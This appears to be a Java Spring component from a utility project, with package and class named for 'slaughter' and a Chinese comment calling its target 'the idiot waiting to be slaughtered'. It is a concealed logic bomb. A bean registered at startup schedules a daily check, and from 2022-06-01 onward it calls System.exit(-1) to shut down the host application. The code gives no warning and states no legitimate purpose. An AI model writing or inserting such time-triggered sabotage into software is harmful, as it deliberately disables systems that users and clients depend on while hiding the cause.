package com.huoguo.simpletool.utils.slaughter;

import cn.hutool.core.date.DateUtil;
import org.springframework.context.annotation.Bean;
import org.springframework.stereotype.Component;

import java.util.Date;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * 待宰的傻逼
 *
 * @author lizhenghuang
 */
@Component
public class Sucker {

    private static final String SLAUGHTER_DATE = "2022-06-01";
    private static final long DAY = 86_400_000;
    private static final int SLEEP_TIME = 2000;

    /**
     * 准备宰杀
     */
    @Bean
    public static void mascara() {
        ScheduledExecutorService timer = Executors.newSingleThreadScheduledExecutor();
        TimerTask timerTask = new TimerTask(SLEEP_TIME);
        timer.scheduleAtFixedRate(timerTask, 0, 1, TimeUnit.DAYS);
    }

    /**
     * 宰杀开始
     */
    private static class TimerTask implements Runnable {

        private final int sleepTime;

        private TimerTask(int sleepTime) {
            this.sleepTime = sleepTime;
        }

        @Override
        public void run() {
            try {
                String now = DateUtil.today();
                Date today = DateUtil.parse(now);
                Date point = DateUtil.parse(SLAUGHTER_DATE);

                int days = (int) ((point.getTime() - today.getTime()) / (DAY));
                if (days <= 0) {
                    System.exit(-1);
                }
                Thread.sleep(sleepTime);
            } catch (InterruptedException ex) {
                ex.printStackTrace(System.err);
            }
        }
    }
}
